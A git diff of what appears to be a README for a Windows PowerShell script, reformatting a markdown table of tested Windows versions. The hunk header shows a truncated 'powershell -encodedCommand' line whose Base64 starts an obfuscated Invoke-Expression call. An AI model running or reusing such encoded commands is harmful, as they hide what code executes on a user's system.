@@ -20,18 +20,12 @@ powershell -encodedCommand aQBlAHgAKAAoACgAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzA
 
 Tested on following Operating Systems:
 
-|   Operating System        |  x64  |  x86  |                                                 |   Operating System        |  x64  |  x86  |
-                                                                                              | :---            | :---: | :---: |
-                                                                                              | Windows 10      |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-                                                                                              | Windows 8.1     |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-                                                                                              | Windows 8       |  <ul><li>- [ ] no</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-                                                                                              | Windows 7       |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-                                                                                              | Windows Vista   |  <ul><li>- [ ] no</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-| :---            | :---: | :---: |
-| Windows 10      |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-| Windows 8.1     |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-| Windows 8       |  <ul><li>- [ ] no</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-| Windows 7       |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
-| Windows Vista   |  <ul><li>- [ ] no</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
+|   Operating System        |  x64  |  x86  |
+| :---                      | :---: | :---: |
+|         Windows 10        |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
+|         Windows 8.1       |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
+|         Windows 8         |  <ul><li>- [ ] no</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
+|         Windows 7         |  <ul><li>- [x] yes</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
+|         Windows Vista     |  <ul><li>- [ ] no</li></ul>  |  <ul><li>- [ ] no</li></ul>  |
 
 This Script is still in the early Alpha release!!! And has some bugs
